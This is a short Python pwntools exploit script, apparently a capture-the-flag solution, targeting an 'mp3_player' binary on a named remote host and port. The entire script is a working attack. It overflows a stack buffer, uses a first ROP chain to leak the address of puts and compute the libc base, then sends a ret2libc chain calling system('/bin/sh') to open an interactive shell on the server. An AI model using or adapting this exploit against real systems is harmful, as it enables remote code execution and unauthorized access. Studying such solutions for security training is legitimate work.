from pwn import *

context.arch = "amd64"
elf = ELF("./mp3_player", checksec=False)
libc = ELF("./libc.so", checksec=False) # Libc used by mp3_player

if args.LOCAL:
    p = elf.process()
else:
    host = args.HOST or "motherload.td.org.uit.no"
    port = int(args.PORT or 8006)
    p = remote(host, port)

offset = 40

# First ROP-chain to leak puts address in libc
rop = ROP(elf)
rop.raw(b"\x90"*offset)
rop.puts(elf.got["puts"])
rop.call(elf.symbols["main"])

# Send payload
p.recvuntil(b"ABBA")
p.sendline(rop.chain())

# Parse the leaked address, and set libc base address
p.recvuntil(b"song\n")
puts_leak = u64(p.recvline().rstrip().ljust(8, b"\x00"))
log.info(f"Puts address found: {hex(puts_leak)}")
libc.address = puts_leak - libc.symbols["puts"]

# Second ROP-chain to get shell on the server
ret_addr = rop.find_gadget(["ret"])[0]
rop = ROP(libc)
rop.raw(b"\x90"*offset)
rop.raw(p64(ret_addr))
rop.system(next(libc.search(b"/bin/sh")))

# Send payload
p.recvuntil(b"ABBA")
p.sendline(rop.chain())
p.interactive()
